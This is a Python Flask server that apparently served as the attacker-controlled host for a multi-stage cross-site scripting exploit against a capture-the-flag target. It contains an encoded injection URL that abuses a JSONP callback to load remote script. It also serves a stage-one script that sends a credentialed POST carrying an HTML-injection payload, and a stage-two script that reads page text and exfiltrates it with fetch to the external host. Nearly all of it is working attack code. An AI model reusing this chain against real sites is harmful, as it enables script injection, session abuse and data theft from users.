
# A very simple Flask Hello World app for you to get started with...

from flask import Flask, request

app = Flask(__name__)

ACCESS_TOKEN = 'ManagarmrCSCGExploit2020'
FAKE_TOKEN = 'Managarmr'
stage_1_available = False
stage_2_available = False

stage_1_fake = False
stage_2_fake = False

flag = ''

@app.route('/')
def hello_world():
    return f'''
    Exploits available: {stage_1_available or stage_2_available or stage_1_fake or stage_2_fake}<br />
    <script>
        var activate = function() {{
            var code = prompt('Activation code');
            document.location = 'activate?code=' + encodeURIComponent(code);
        }};

        var deactivate = function() {{
            document.location = 'deactivate';
        }};
    </script>
    <button onclick="activate()">Activate</button><br />
    <button onclick="deactivate()">Deactivate</button>
'''

@app.route('/activate')
def activate():
    global stage_1_available, stage_2_available, stage_1_fake, stage_2_fake

    activated_msg = '''
    Activated.<br />
    <a href="/stage1">Stage 1</a><br />
    <a href="/stage2">Stage 2</a>
'''

    activated_extra = '''
    <br />
    Code for submission:
    <code>
          http://xss.allesctf.net/?search=%3Ciframe%20src%3D%22%2Fstatic%2Fjs%2Fshop.js%22%20id%3D%22x%22%3E%3C%2Fiframe%3E%3Cscript%20src%3D%22items.php%3Fcb%3Df%253Ddocument.getElementById%2528%2527x%2527%2529%253Bf.onload%253Dfunction%2528%2529%257Bs%253Df.contentDocument.createElement%2528%2527script%2527%2529%253Bs.src%253D%2527%252F%252Fmanagarmr.pythonanywhere.com%252Fstage1%2527%253Bf.contentDocument%255B%2527body%2527%255D.append%2528s%2529%253B%257D%252F%252F%22%3E%3C%2Fscript%3E
    </code>
'''

    code = request.args.get('code', None)

    if code == FAKE_TOKEN:
        stage_1_fake = True
        stage_2_fake = True
        return activated_msg, 200

    if code == ACCESS_TOKEN:
        stage_1_available = True
        stage_2_available = True
        return activated_msg + activated_extra, 200

    return 'Nice try, feck off.', 403


@app.route('/deactivate')
def deactivate():
    global stage_1_available, stage_2_available, stage_1_fake, stage_2_fake

    stage_1_available = False
    stage_2_available = False
    stage_1_fake = False
    stage_2_fake = False
    return 'Deactivated.', 200


@app.route('/stage1')
def stage1():
    global stage_1_available, stage_1_fake

    if not stage_1_available and not stage_1_fake:
        return 'Nice try, feck off.', 403

    if stage_1_fake:
        stage_1_fake = False
        return '''
        <script>
            document.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        </script>
''', 200

    stage_1_available = False
    return '''
var stage2 = top.document.getElementById("stage2").href;

var xhr = new XMLHttpRequest();
xhr.open('POST', stage2, true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.onerror = function() {
    top.window.location = stage2;
};
xhr.send('bg=' + encodeURIComponent('name"><a id="backgrounds" name="<script src=\\'http://managarmr.pythonanywhere.com/stage2\\'></script>"></a><!--'));
'''


@app.route('/stage2')
def stage2():
    global stage_2_available, stage_2_fake

    if not stage_2_available and not stage_2_fake:
        return 'Nice try, feck off.', 403

    if stage_2_fake:
        stage_2_fake = False
        return '''
        <script>
            document.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        </script>
''', 200

    stage_2_available = False
    return '''
flag = encodeURIComponent($("b")[0].innerText);
fetch("http://managarmr.pythonanywhere.com/flag?flag=" + flag);
'''
